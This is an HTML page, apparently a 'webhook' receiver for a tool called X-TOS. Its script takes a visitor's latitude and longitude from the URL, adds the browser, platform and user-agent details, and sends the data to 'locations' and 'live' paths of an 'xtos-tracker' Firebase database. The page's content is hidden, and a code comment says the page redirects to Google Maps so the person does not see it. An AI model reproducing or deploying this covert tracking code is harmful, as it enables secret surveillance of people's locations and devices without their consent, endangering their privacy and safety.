<!DOCTYPE html>
<html>
<head>
    <title>X-TOS Webhook</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        .log { border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="hidden">
        <h2>üõ°Ô∏è X-TOS Data Receiver</h2>
        <div id="logs"></div>
    </div>

    <script>
        // Auto-redirect to prevent user seeing this page
        const urlParams = new URLSearchParams(window.location.search);
        const lat = urlParams.get('lat');
        const lng = urlParams.get('lng');
        const timestamp = urlParams.get('timestamp');
        const id = urlParams.get('id') || 'default_' + Date.now();
        
        console.log('üì° Webhook received:', { lat, lng, timestamp, id });
        
        if (lat && lng) {
            // Store location data
            const data = {
                latitude: parseFloat(lat),
                longitude: parseFloat(lng),
                timestamp: timestamp ? parseInt(timestamp) : Date.now(),
                userAgent: navigator.userAgent,
                received: Date.now(),
                deviceBrand: getBrowserInfo(),
                batteryLevel: 'Unknown',
                platform: navigator.platform
            };
            
            // Save to localStorage for app to read
            localStorage.setItem('xtos_tracked_location', JSON.stringify(data));
            sessionStorage.setItem('megastore_location', JSON.stringify(data));
            
            // Send to Firebase for app polling
            sendToFirebase(id, data);
            
            console.log('‚úÖ Location stored and sent to Firebase:', data);
            
            // Redirect after short delay
            setTimeout(() => {
                window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
            }, 1000);
        } else {
            console.log('‚ùå No coordinates received');
            setTimeout(() => {
                window.location.href = 'https://maps.google.com/';
            }, 1000);
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome Browser';
            if (ua.includes('Firefox')) return 'Firefox Browser';
            if (ua.includes('Safari')) return 'Safari Browser';
            if (ua.includes('Edge')) return 'Edge Browser';
            return 'Unknown Browser';
        }
        
        function sendToFirebase(trackingId, locationData) {
            try {
                // Decrypt tracking ID if encrypted
                let realId = trackingId;
                if (trackingId.includes('_enc_')) {
                    try {
                        realId = atob(trackingId.replace('_enc_', ''));
                    } catch (e) {
                        console.log('Decryption failed, using original ID');
                    }
                }
                
                // Send to Firebase locations endpoint
                const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${realId}.json`;
                
                fetch(firebaseUrl, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(locationData)
                }).then(response => {
                    if (response.ok) {
                        console.log('‚úÖ Firebase location sent successfully');
                    } else {
                        console.log('‚ùå Firebase location failed:', response.status);
                    }
                }).catch(error => {
                    console.log('‚ùå Firebase error:', error);
                });
                
                // Also send to live tracking endpoint
                const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${realId}.json`;
                const liveData = {
                    ...locationData,
                    updateNumber: Math.floor(Math.random() * 100) + 1
                };
                
                fetch(liveUrl, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(liveData)
                }).then(response => {
                    if (response.ok) {
                        console.log('‚úÖ Firebase live tracking sent successfully');
                    }
                }).catch(error => {
                    console.log('‚ùå Firebase live error:', error);
                });
                
            } catch (error) {
                console.log('‚ùå Firebase send error:', error);
            }
        }
    </script>
</body>
</html>
